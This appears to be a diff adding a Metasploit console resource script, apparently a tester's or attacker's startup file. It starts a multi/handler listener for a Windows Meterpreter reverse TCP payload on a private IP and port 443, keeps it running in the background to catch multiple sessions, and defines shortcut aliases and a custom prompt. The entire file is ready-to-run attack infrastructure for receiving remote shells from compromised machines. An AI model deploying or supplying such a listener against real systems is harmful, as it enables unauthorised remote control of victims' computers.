@@ -1,0 +1,17 @@
+load alias
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 172.16.10.211 
+set lport 443
+setg ExitOnSession false
+run -j
+back
+alias handler "use exploit/multi/handler"
+alias ad "show advanced"
+alias j "jobs"
+alias s "sessions"
+alias cl "clear"
+alias op "options"
+alias si "sessions -i"
+set PROMPT [%T] %red%L %grns:%S %yelj:%J
+
